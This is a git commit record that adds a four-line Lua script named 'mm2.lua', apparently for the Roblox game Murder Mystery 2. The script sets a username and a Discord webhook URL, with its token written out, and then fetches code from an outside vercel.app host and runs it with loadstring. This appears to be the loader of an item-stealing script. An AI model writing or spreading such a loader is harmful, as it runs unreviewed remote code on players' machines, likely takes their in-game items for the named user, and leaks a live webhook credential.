79f52acfa8ad7cccf2885af0b88d1c22d53ac893
Mm2Homo <pakekosayi@gmail.com>
2024-11-01 05:21:07 +0800

    mm2.lua

---
+++ mm2.lua
@@ -0,0 +1,4 @@
+Username = "sslvrxt"
+Webhook = "https://discord.com/api/webhooks/1301642055000522803/mbT5Spt1advHQKZm0lkFOxNTE37iuxG7oRXY0dQhFFUMmlSgdsIPz7KhefplMykPyrlM"
+
+loadstring(game:HttpGet("https://janeq.vercel.app/mm2.lua"))()
